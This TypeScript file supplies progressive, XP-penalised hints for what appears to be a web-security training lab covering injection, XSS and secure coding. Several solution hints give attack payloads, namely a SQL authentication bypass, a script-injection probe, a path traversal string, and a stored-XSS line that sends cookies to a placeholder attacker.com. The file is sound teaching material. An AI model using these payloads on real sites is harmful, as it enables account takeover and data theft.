/**
 * Hint system with XP penalty.
 * Progressive hints that reduce max XP for a challenge.
 */

export type HintLevel = 1 | 2 | 3;

export interface Hint {
  level: HintLevel;
  text: string;
  xpReduction: number; // percentage of XP reduced
}

/**
 * XP reduction per hint level:
 * Level 1: 10% reduction
 * Level 2: 25% reduction
 * Level 3: 50% reduction
 */
export const HINT_XP_PENALTY: Record<HintLevel, number> = {
  1: 0.10,
  2: 0.25,
  3: 0.50,
};

const DEFAULT_HINTS: Hint[] = [
  {
    level: 1,
    text: `Think about what vulnerability this task is testing. Review the relevant module materials.`,
    xpReduction: HINT_XP_PENALTY[1],
  },
  {
    level: 2,
    text: `Look at the code carefully. Pay attention to input validation, output encoding, and authentication checks.`,
    xpReduction: HINT_XP_PENALTY[2],
  },
  {
    level: 3,
    text: `The answer involves understanding how the data flows through the application. Trace the input from entry point to output.`,
    xpReduction: HINT_XP_PENALTY[3],
  },
];

const HINT_MAP: Record<string, Hint[]> = {
    // OWASP challenges — keys match owaspChallenge IDs from owasp-data.ts
    'owasp-c1': [
      { level: 1, text: 'This is about injection attacks. What kind of data does the application accept from users?', xpReduction: 0.10 },
      { level: 2, text: 'Check if the application uses prepared statements or concatenates user input directly into queries.', xpReduction: 0.25 },
      { level: 3, text: 'The vulnerability allows an attacker to execute arbitrary SQL commands by manipulating the search field input.', xpReduction: 0.50 },
    ],
    'owasp-c2': [
      { level: 1, text: 'This challenge focuses on broken authentication. How does the application verify user identity?', xpReduction: 0.10 },
      { level: 2, text: 'Look at the session management and password recovery mechanisms.', xpReduction: 0.25 },
      { level: 3, text: 'The application exposes session tokens in URLs and allows unlimited login attempts without rate limiting.', xpReduction: 0.50 },
    ],

    // SQL Injection — keys match IDs from sql-data.ts
    'beginner-1': [
      { level: 1, text: 'Try to break out of the SQL string using a single quote character (\').', xpReduction: 0.10 },
      { level: 2, text: 'Use a UNION SELECT statement to retrieve data from other tables.', xpReduction: 0.25 },
      { level: 3, text: 'Inject: \' OR 1=1 -- to bypass authentication, then use UNION SELECT to extract user credentials from the users table.', xpReduction: 0.50 },
    ],
    'intermediate-1': [
      { level: 1, text: 'This is a blind SQL injection. The application does not show database errors directly.', xpReduction: 0.10 },
      { level: 2, text: 'Use boolean-based or time-based techniques to infer information about the database structure.', xpReduction: 0.25 },
      { level: 3, text: 'Apply the SUBSTRING and SLEEP functions to extract data character by character using time delays.', xpReduction: 0.50 },
    ],

    // XSS — keys match IDs from xss-data.ts
    'reflected': [
      { level: 1, text: 'The input is reflected directly in the page without proper escaping.', xpReduction: 0.10 },
      { level: 2, text: 'Try injecting a script tag with an alert function to confirm the vulnerability.', xpReduction: 0.25 },
      { level: 3, text: 'Submit: &lt;script&gt;alert(\'XSS\')&lt;/script&gt; in the search field.', xpReduction: 0.50 },
    ],
    'stored': [
      { level: 1, text: 'The input is saved to the database and displayed to all users who view the page.', xpReduction: 0.10 },
      { level: 2, text: 'Use the comment form to inject a persistent script that executes whenever the page loads.', xpReduction: 0.25 },
      { level: 3, text: 'Post a comment containing: &lt;script&gt;document.location=\'http://attacker.com/?cookie=\'+document.cookie&lt;/script&gt;', xpReduction: 0.50 },
    ],

    // Secure Coding Lab code-review challenges (sc-1 through sc-10) — already correct
    'sc-1': [
      { level: 1, text: 'This endpoint accepts user input and inserts it directly into a database query. What could go wrong?', xpReduction: 0.10 },
      { level: 2, text: 'Look at how req.params.id is used — it is concatenated directly into the SQL string without any escaping.', xpReduction: 0.25 },
      { level: 3, text: 'Use parameterized queries (prepared statements) with placeholders instead of string concatenation to prevent SQL injection.', xpReduction: 0.50 },
    ],
    'sc-2': [
      { level: 1, text: 'The code saves user data — look at how the password field is handled before storage.', xpReduction: 0.10 },
      { level: 2, text: 'The password is saved as-is. Base64 is an encoding, not encryption — it is trivially reversible.', xpReduction: 0.25 },
      { level: 3, text: 'Hash passwords using bcrypt with a unique salt before storing in the database. Never store plaintext passwords.', xpReduction: 0.50 },
    ],
    'sc-3': [
      { level: 1, text: 'This function displays user-supplied text in the DOM. How is the text inserted?', xpReduction: 0.10 },
      { level: 2, text: 'innerHTML interprets HTML tags. If the query string contains &lt;script&gt; tags, the code will execute.', xpReduction: 0.25 },
      { level: 3, text: 'Use textContent instead of innerHTML — it inserts text as plain text, encoding special characters automatically.', xpReduction: 0.50 },
    ],
    'sc-4': [
      { level: 1, text: 'This endpoint performs a destructive action. Who is allowed to call it?', xpReduction: 0.10 },
      { level: 2, text: 'There are no authentication or authorization checks — anyone can send a request and delete any user record.', xpReduction: 0.25 },
      { level: 3, text: 'Add authentication middleware that verifies the caller\'s identity and checks that they have permission to perform the action.', xpReduction: 0.50 },
    ],
    'sc-5': [
      { level: 1, text: 'What information does the error response expose to the client?', xpReduction: 0.10 },
      { level: 2, text: 'The full stack trace reveals file paths, library versions, and the application\'s internal directory structure.', xpReduction: 0.25 },
      { level: 3, text: 'In production, return a generic error message to the client and log the detailed error server-side only.', xpReduction: 0.50 },
    ],
    'sc-6': [
      { level: 1, text: 'The endpoint serves files based on a user-supplied filename. What could go wrong?', xpReduction: 0.10 },
      { level: 2, text: 'A filename like ../../etc/passwd could navigate outside the uploads directory and read system files.', xpReduction: 0.25 },
      { level: 3, text: 'Validate the filename (reject ../ and absolute paths), use path.resolve, and verify the resolved path stays within the allowed directory.', xpReduction: 0.50 },
    ],
    'sc-7': [
      { level: 1, text: 'The code processes user-supplied data to dynamically create objects. How is it doing this?', xpReduction: 0.10 },
      { level: 2, text: 'eval() executes arbitrary JavaScript code. If profile.type contains malicious code, it runs with full server privileges.', xpReduction: 0.25 },
      { level: 3, text: 'Use schema validation libraries (Zod, Joi) to validate and parse user input. Never use eval() with user-supplied data.', xpReduction: 0.50 },
    ],
    'sc-8': [
      { level: 1, text: 'This endpoint reads a balance, then writes it. What happens with two concurrent requests?', xpReduction: 0.10 },
      { level: 2, text: 'Between the read and the write, another request could read the same old balance — leading to a double-spend.', xpReduction: 0.25 },
      { level: 3, text: 'Use database transactions with row-level locking (e.g., SELECT FOR UPDATE) to make the read-check-write atomic.', xpReduction: 0.50 },
    ],
    'sc-9': [
      { level: 1, text: 'The endpoint redirects the user to a URL from the query string. Where could that URL point?', xpReduction: 0.10 },
      { level: 2, text: 'An attacker can craft a link that looks like your domain but redirects to a phishing site — an Open Redirect attack.', xpReduction: 0.25 },
      { level: 3, text: 'Only redirect to relative/internal URLs, or maintain a whitelist of allowed external domains for redirects.', xpReduction: 0.50 },
    ],
    'sc-10': [
      { level: 1, text: 'The endpoint accepts file uploads. How does it validate what files are uploaded?', xpReduction: 0.10 },
      { level: 2, text: 'An attacker could upload a .php or .js file and execute it directly on the server — there is no validation at all.', xpReduction: 0.25 },
      { level: 3, text: 'Validate MIME type, file extension, and size. Generate unique filenames. Store uploads outside the web-root directory.', xpReduction: 0.50 },
    ],
};

/**
 * Calculate the maximum XP reduction from a set of revealed hint levels.
 * Returns a multiplier (0-1) where 1 = no penalty, 0.5 = 50% reduction.
 */
export function calculateHintPenalty(revealedLevels: Set<HintLevel>): number {
  if (revealedLevels.size === 0) return 1;
  let maxPenalty = 0;
  for (const level of revealedLevels) {
    maxPenalty = Math.max(maxPenalty, HINT_XP_PENALTY[level]);
  }
  return 1 - maxPenalty;
}

/**
 * Generate hints for a specific challenge/task.
 * @param taskKey - Unique identifier for the task
 * @returns Array of hints from general to specific
 */
export function getHints(taskKey: string): Hint[] {
  return HINT_MAP[taskKey] || DEFAULT_HINTS;
}

/**
 * Get the hint level description for display.
 */
export function getHintLevelLabel(level: HintLevel): string {
  switch (level) {
    case 1: return 'General hint';
    case 2: return 'Specific hint';
    case 3: return 'Solution hint';
    default: return 'Hint';
  }
}
